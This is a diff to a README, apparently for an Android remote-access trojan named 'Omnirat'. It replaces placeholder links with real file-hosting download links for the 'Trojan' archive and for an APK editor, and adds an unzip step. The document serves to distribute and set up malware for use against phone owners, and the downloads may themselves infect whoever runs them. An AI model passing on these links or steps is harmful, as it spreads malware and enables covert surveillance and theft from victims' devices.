@@ -77,16 +77,17 @@ keep your url safe together with your auth token, youll need it later.
 
 
 1. install the omnirat **Trojan** with the button below
+   > dont forget to unzip it
 
 <p align="left">
-  <a href="https://your-download-link.com">
+  <a href="https://www.mediafire.com/file/hw0jk1dtly2ch3t/Omnirat.zip/file">
     <img src="https://img.shields.io/badge/Download%20App-100000?style=for-the-badge&logo=android&logoColor=white" alt="Download Omnirat" />
   </a>
 </p>
 
 2. Download apk editor pro
    <p align="left">
-  <a href="https://your-download-link.com">
+  <a href="https://www.mediafire.com/file/ljypyy66gwzde51/APK+editor+pro.apk/file">
     <img src="https://img.shields.io/badge/Download%20App-100000?style=for-the-badge&logo=android&logoColor=white" alt="Download Apk editor pro" />
   </a>
 </p>
